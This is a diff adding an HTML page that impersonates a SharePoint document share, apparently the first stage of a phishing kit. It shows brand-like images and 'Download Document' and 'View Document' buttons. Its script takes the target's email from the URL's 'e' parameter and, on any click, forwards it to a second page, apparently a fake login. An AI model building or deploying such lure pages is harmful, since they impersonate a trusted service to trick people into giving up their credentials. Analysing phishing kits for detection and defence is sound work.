@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Share Point</title>
+<link href="local_resources/css/715b583662145a45d6cd72d7051cfd11.css" rel="stylesheet"/>
+<style>
+        .content {position: relative;z-index: 1; }
+        .imgsec{ flex-direction:column; }
+    </style>
+</head>
+<body>
+<header class="container-fluid bg-white d-flex py-1" style="width: 100vw; z-index: 2; position: absolute;">
+<div class="d-flex align-items-center container" href="#" style="position: relative; z-index: 2;">
+<img class="me-2" src="local_resources/img/7c06dab6c7e4577f5725ecc6094e2417.jpg"/>
+</div>
+</header>
+<div class="content container d-flex justify-content-center align-items-center vh-100">
+<video autoplay="" loop="" muted="" playsinline="" poster="index.html" style="object-fit: cover; width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: -1;">
+
+
+</video>
+<div class="text-center" id="middleman">
+<div class="imgsec d-flex justify-content-center align-items-center mb-4">
+<img class="" src="local_resources/img/b20707868727cb11729d547e807d059f.png" style="min-width:125px; width: 123px; max-height: 100px;"/>
+<img class="img-fluid" src="local_resources/img/98ee3fcfd2ebec92ebf32edc85bd62c6.png" style=""/>
+</div>
+<button class="btn btn-primary me-3" style="border-radius: 2px" type="button">Download Document</button>
+<button class="btn btn-secondary me-3" style="border-radius: 2px" type="button">View Document</button>
+<div class="imgsec d-flex justify-content-center align-items-center mt-4">
+<img class="img-fluid" src="local_resources/img/eff1f87bec32fe6728358dfc6e2e1f1c.png" style=""/>
+</div>
+</div>
+</div>
+<script src="local_resources/js/d14413165e997c7cd38b8ade0e884101.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const takata = new URLSearchParams(window.location.search);
+        const emery = takata.get('e');
+        const buttons = document.querySelectorAll("button");
+        buttons.forEach(button => {
+          button.addEventListener('click', function() {
+            window.location.href = "second.html?e="+emery
+          });
+        });
+    })
+  </script>
+</body>
+</html>
